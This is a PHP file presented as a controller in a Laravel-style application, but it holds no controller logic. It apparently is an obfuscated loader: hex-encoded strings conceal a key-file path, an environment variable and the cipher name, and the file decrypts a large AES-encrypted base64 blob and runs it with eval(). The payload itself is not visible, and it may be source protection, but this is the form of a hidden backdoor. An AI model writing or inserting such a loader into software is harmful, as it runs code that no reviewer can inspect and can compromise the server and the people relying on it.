<?php
namespace App\Http\Controllers\Sistem;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('3VStIC9ETOa9sUSZ6Ku/GQ==');

$c=base64_decode(

'8FatMo35YRENNY978ficUKJ0/vl5DQ4KbhJEHGWJduWI6FELAR4qr94T6a6mAhWMwmSMhUB8m3W+' .
'5Wt2NLV8EasJmFsnvnQV+xfgHElYxdAPfES/y7MmQC5OLEujO0VdByQ2ll+jvRzzEte0U4btJp0x' .
'r7SpLYKrzHB25BgLZLJ+0pNyl1xY3Aa8qjgkYVrQNtkahpb2XcTrHhO+jNisDae+iYe64Q6LiaeC' .
'kEtbem5M3lGNuwv03M63NyyXfqAmSMyXdqdtQbyt9bBYbBBLTTG+o9aLM1YIzrnltUy1vi4qRh9C' .
'MPvw9+9zR+ZYDw0zRNxk2mj3k/j7RjiC+L6ZKIIewjwzk56AX3tWdbnpQ7iH2/7lMVZDzhz+en9z' .
'KnCEDtQBKkzjbmY5eCDw768+jtAaqAav/I4hl6/z71A5G0j+WMTyJwg2nJwKCuNdRc1IoLAlyHWL' .
'88OyrAMMCpKc4iw1ph1MIWK4ZdwQg5BIOpA7pQ9LuPqFcXRE+yw/M0ptEFOSSXaDzam+AIzDrnGX' .
'OJZadZ7G7T2GzsMGTn8mw0BtG3W0H+unCUzSSlQYraq29jPFvrG/dJ9Hfpns99cFkoiiJc6V7Hp+' .
'cSZM8gCmZB1ge0e8SMiakIO37IoI+ZGOzVMrhHX6eXopXW1a34NcwmyDk3pdp3XtvLEHCS2QCGvD' .
'IdAWi5dFi2VL/TD3/hJA1TL5bMHUMMzvKcmA++7Cd/7cTdLHmKRyy6Y4l+3OhplVIy5T58O8o4lT' .
'Kokqao23aRwlHm0behyfd2nh+bwxfPKGxAGiUgxlMwTgHsmSTtALhV+/gv527ggmMONVKa5Losgl' .
'ECtNHxGge2NL4lPotCBfeo2aRnAgLyTlZfnf+cSRxJleJwL88cM8o+Y29/xf3Wne9rns+IYBY8FN' .
'opew9UfwqjJfrKRA1drKnGbbE1FH8gH+zAFJiH8fm1SbmKUaPawX+4lufqq9t7JjehubNRvvnQAA' .
'oYPpolRGBRe1bpFSC7TvPaXnK10MfLsCZ73mxcqpKgnq5IFPL2diqO5CyZz7flOvTOZ65jmjK6Lk' .
'4SKRfbPksT6fO4Tep7Tu7clGJ+oglQET44q77V9tK8hsOL7F94Ockvy59xqDJx3EvyuIFHJXUwMO' .
'wXddUSBp3CBJOhAzqrvIFCKOWuFj4OP1KTO5L3fs77GYirt8e8dpjCRfIBlfZbrKXvyzoP73BKuz' .
'OnPwkSgiI9mT/jPc3Ae3NkKsNk0ey7NskksuVwhmqrnGKnob5Ew+v7W7gTlpsYvJJEXF/X94kmxR' .
'dkhFb9f5GauCwq71HGzL/6fcaUgvGPy3DJVFjni4TxmxgLSmMDV01CLShPw9FrI8fFny88F0i6j0' .
'lefFogBymb1aX9Owym3rDHxiWR28GmegRwDzqBnDDxfCcpxNg07zhLmVcJidDuxlet12IXikloGG' .
'wZSggCGiFI19vHK1yzhwSEPElKvwijgmMlcySUSSvFp2ZbyfefsKpSsuWa9/kQv0q8p6MAkzye+V' .
'cYVlw7LZ4bz635C1ahrHu5rZRDfnePqvBvDRWBNd2nxsASasfioNRFyZMOnnCJ/CRK3Ks/dNfFPt' .
'Mu0lfzLIn+vSC7Hm6sqlRbo/kVnEBMUKf38nh4ERy6DQLHiTDb1H1qZKl/Q7i4nDFpNg5Va1GzO6' .
'sO/NWtKbjy80yMAG8nXcPDpcGQg6bf7HrlcVVDytNigJE6Kfkh+4VlCRi4vZRU+KFMl/9q1sU2qi' .
'425vlDa2MKek3kWizHicdE49CAp7dj2tIEKhYeWz2dElWK5PFJVqusq5oSGmV0AgrmUIqQDHKsxk' .
'IknHw8jnqUy7qXAXF4HHCg8rMXZNF0pHhwxVRHNNSE9KII4wCFO1pXp2Ml/KMiTC4tvBEYrjzEB+' .
'7PEoeQYJpqISanJrZJ0ewQLR2wl2/faA9ZfrdrqQdBqXi9zv3AG+ZjX7njX8ftrx03j7WSX6rtZ1' .
'N25BfQ1lbLx9BQ4cWRCMRwMQ2cgjaynzBqiiU0VuQgg2dXiLEJ4ecw3L7a6OCcEMdhRID5Oto7D6' .
'C59Ydiu/4jVSh2NQreRmLfsE1jUfkNhLPZq2F3ammaxxor+ZfVUvNGtJxgCYWi5CU9csA5xLTSc4' .
'zvKkSgegbg+4CXvAyuC35KU3jcNkWNlYlSyLUDttnr4uCHiU8mob7HGNOPGqcTpCp0nT5CDk1BVz' .
'mdPeCPVpBkTYN9wNmLZcBF2fssB8TwJ9RgWKIIOu/XwZOfLXUhq/2va4LKA1/opAEmHWLXAkk1S9' .
'28RvWRjRY1N/570oeNxcFGRvmqjE9Ozdr8DSK6LrkzlCjcwxSQGKpuUlTLtdANJtfriAiJHZGMWm' .
'sznj4sXdg43zm0tGxP0stT4qYLNpFQPzKNKn23Fd0riUsumTICFyUIZnDX0SZ2kFSfBzxKc4d6a1' .
'2Im7YQbPZOwdG2wTgOQ+Z3xphQaEHr1W9z6c1y7RfnO/qD6CgfjjYeLU0ueeH+fAm7sDDLBS1BHS' .
'LbBFRRTtPRZvTaNCJdyx3nxeLEzFWSirhrNbGr0LVOrteF3Z6qnkjm4BkMor3ywaLfLwtj2KovYB' .
'Lfpv+bNPUpn9VifDurj2FCl+A+O7jhaWpKn9ia/7K3o7TBn8np1N8obIVjbds/u4SwROOavAchoo' .
'Zr1QaGvoN0/gAb+VpylNOZewvHYU9eUtJkqiRc+5gpPyojTC22Izbo6jOaX73/WwZ7xc/9aiddvM' .
'D5i3kPTR+q9SlExae2sD7Uik5M7GpAsKSmYYqjerMPETbwu5NkcRv2dzb2sAC5rC5vifRWT9J+kQ' .
'YlC0mubvL3fAnSu9FL4d9H2K7nhvDhz9OTJnLzGjtZzsfn5swpe9MZ3+rtXKMsSSt/mlZYwUYm7j' .
'jMxPVXGR3qBZT0C55LPUx2FAAFlBdmSCG9ffEUJweosbpo2PNO9+VlDqP73ywJ0LWy0pQpkNS5oK' .
'd3OLe/vVy0mLY6+WdaFTbCBnoVjtmtvvzrPKP/BPiEXUyurFPAHSPkjhgI1O8B/OlaF4Kpw4OnGZ' .
'z1IqN9PLTpb+diAyK71FXQs293t4hPkOOSVGwH8zC5xI2stCK0VfT3glJYijI1L6NQTWvi+R8ypk' .
'UkfCfWf1NiEOFUQ/KDvvq6d+Pj+mGlT3czcAZneM8o+nzBZexSL2QaC1dvhKgAgcyH+Po8VnmSRX' .
'iinnqKdMDVIrKcpmYspJwUJtAhv7ExvmKg50+zGmqW9JBTMIxh3XAzd/n0Hpxh/cmo6bM/FJqjLf' .
'0O9Xkk8lz+S2zPB5XBptrpnhCOw/0CwNaPTFGi/YKWCBeJaHAB0L6vn8XIkhm9ChTaQ47GEqVnKS' .
'Ap2EOL62+EXpPp29sRoLBIT3k/n6bamBVisyzJPABhP+dboGpOXbt6WpM2hZRNEYVY4pbzSUVLVS' .
'wTXzM4CCKwiVQapMcRplc1g2t2Bhj6k9vCYO6QKH/pYebLwMD1PXgqSOxIgg/MK2ir04a7yCiM6T' .
'rE81+/wBbLpoi0H7EbF/A8hnwJjOUHY6zJFU7cgxRbir3frmcM8+con+/DEJaLewUFgVehnrz5pg' .
'YvZYmUns65OV5GO/CMqw9hhrfLWxoaVLo7rS5TH8p0pq6vZN1kndkOTA65/WXPh/MZHsnKqgSpvL' .
'KDYqyAEgf9ZGufbLrhF+XZjk1xYot7DZfrkORhD53v0Cd65HFXj8vijW1D60iSWJzM5hUldsGzvz' .
'kO9j3c5z0/ZIxZYlMn4lGCDTwmz3W2TcgUALsLNEG8ymCB74G8Rqr7nw0iRCFgjtisA2YHkp62hC' .
'RARqS0S6b0bayb75WeTCMPLJ+acW69pyOgbS9sKJ7H3zwIJMEhv20WzVrt1vVkHLau95+R44oJ4Z' .
'nqwgDyNQqDBWae5kWdCq5Z+bLl2BoUE1kAclF8l4egiE3Zad5WepXhKTKDLoGzyGz4qR89ytsgbx' .
'zTQEKPKdp854sOq2JbSuUeOqYMDgSI4aVvL7kIN17vmFuY99xAo1fOqZJ9Qi1LK89dRJZCGa3Jnd' .
'taC5TZL8v2OTjvRlw7k6nLk+jgrfnduwV31eoRwJxxOmiBQE4PgD1VFObtWdNYIuk8BERXn7JP+2' .
'1wSazq2iD02J8Q=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

